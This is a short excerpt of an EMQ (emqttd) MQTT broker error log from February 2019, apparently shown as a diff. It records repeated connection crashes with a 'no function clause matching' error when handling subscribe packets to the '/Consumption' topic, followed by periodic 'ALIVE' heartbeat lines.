+09:29:20.418 [error] CRASH REPORT Process <0.17064.4> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},49612},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.17064.4>,...}) line 191 in gen_server2:terminate/3 line 1157 
+09:29:20.418 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.17064.4> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},49612},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.17064.4>,...}) line 191 in context connection_crashed
+09:34:07.134 [error] gen_server <0.17113.4> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},49660},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.17113.4>,...}) line 191
+09:34:07.135 [error] CRASH REPORT Process <0.17113.4> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},49660},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.17113.4>,...}) line 191 in gen_server2:terminate/3 line 1157 
+09:34:07.135 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.17113.4> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},49660},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.17113.4>,...}) line 191 in context connection_crashed
+
+===== ALIVE Mon Feb 18 09:49:07 CST 2019
+
+===== ALIVE Mon Feb 18 10:04:07 CST 2019
